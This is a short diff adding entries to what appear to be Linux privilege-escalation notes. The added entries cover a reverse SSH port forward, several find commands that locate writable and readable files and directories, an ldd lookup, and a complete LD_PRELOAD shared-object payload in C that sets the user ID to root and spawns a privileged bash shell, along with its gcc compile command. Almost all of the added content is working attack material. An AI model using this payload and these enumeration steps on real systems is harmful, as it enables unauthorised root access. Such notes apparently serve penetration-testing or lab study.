@@ -541,4 +541,31 @@ ps aux | grep "^root"
 On Debian-like distributions, dpkg can show installed programs and their version:
 dpkg -l | grep <program>
 
+port Forwarding using ssh:
+ssh -R <local-port>:127.0.0.1:<target-port> <username>@<local-machine>
+
+Find all writable files in /etc:
+find /etc -maxdepth 1 -writable -type f
+
+Find all readable files in /etc:
+find /etc -maxdepth 1 -readable -type f
+
+Find all directories which can be written to: 
+find / -executable -writable -type d 2> /dev/null
+
+preload.c file:
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+    void _init() {
+    unsetenv("LD_PRELOAD");
+    setresuid(0,0,0);
+    system("/bin/bash -p");
+}
+
+This can be compiled to generate a so file:
+gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
+
+print the shared libraries used by a program:
+ldd /usr/sbin/apache2
 
